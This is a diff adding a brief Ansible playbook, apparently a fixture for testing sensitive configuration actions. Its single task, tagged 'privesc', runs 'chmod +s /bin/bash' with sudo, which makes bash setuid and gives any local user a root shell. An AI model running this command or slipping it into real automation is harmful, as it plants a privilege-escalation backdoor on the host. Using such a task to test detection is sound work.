@@ -1,0 +1,15 @@
+- name: Perform sensitive Ansible configuration tests
+  hosts: localhost # Target host(s) - change as needed for your test environment
+  gather_facts: no # May not need facts for these specific tests
+  become: yes # Many sensitive actions require elevated privileges [1-4]
+  become_method: sudo # Or other become methods relevant to your test setup
+
+  tasks:
+    - name: Test Setuid Binary Creation via Task Injection
+      ansible.builtin.shell: |
+        chmod +s /bin/bash
+      args:
+        executable: /bin/bash 
+      tags:
+        - privesc
+        - file_manipulation
